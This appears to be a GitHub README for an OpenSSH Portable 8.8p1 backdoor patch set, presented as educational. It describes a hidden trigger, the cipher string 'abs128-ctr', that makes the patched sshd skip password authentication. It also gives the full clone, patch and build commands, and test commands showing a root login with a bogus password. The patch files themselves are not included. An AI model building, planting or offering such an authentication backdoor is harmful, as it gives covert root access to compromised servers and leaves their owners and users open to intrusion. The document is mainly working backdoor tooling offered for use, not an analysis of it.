# openssh-backdoor
Experimental backdoor for OpenSSH Portable. Patch for OpenSSH Portable v8.8_p1. For educational/ethical purposes only!

## How does it work?

This repo contains a patch for OpenSSH (server and client) to allow for a complete authentication bypass without modifying configuration files on the target server endpoint, adding new users, overwriting credentials, etc. The patch creates a special cipher suite, in this case `abs128-ctr`, that acts as an activation phrase for the backdoor. The OpenSSH client is modified to allow for this new cipher suite string to be sent, and the OpenSSH server, upon receiving the special cipher suite string, will bypass PASSWD authentication for the session. 

## Installation and Patching 

The following commands when issued will patch OpenSSH and produce a modified ssh client in `/tmp/ssh` and a modified server in `/usr/local/sbin/sshd`. 

```
git clone https://github.com/openssh/openssh-portable
git clone https://github.com/Psmths/openssh-backdoor
cp ./openssh-backdoor/*.patch ./openssh-portable/
cd openssh-portable/
patch -u auth-passwd.c -i auth-passwd.c.patch
patch -u auth.c -i auth.c.patch
patch -u cipher.c -i cipher.c.patch 
patch -u kex.c -i kex.c.patch
patch -u kex.h -i kex.h.patch
patch -u packet.h -i packet.h.patch
patch -u servconf.c -i servconf.c.patch
patch -u ssh.c -i ssh.c.patch
patch -u sshd.c -i sshd.c.patch
autoreconf
./configure --bindir=/tmp/
make -j 16
```

To test, run the modified server binary and set it to listen on some port:

```
sudo /usr/local/sbin/sshd -p 9001
```

Attempt to authenticate without the special cipher suite string, and a bogus password. This should fail.
```
/tmp/ssh root@127.0.0.1 -p 9001 -c "chacha20-poly1305@openssh.com"
```

Attempt to authenticate with the special cipher suite string, in this case `abs128-ctr`, and a bogus password. This should seccessfully authenticate you as root.
```
/tmp/ssh root@127.0.0.1 -p 9001 -c "abs128-ctr,chacha20-poly1305@openssh.com"
```
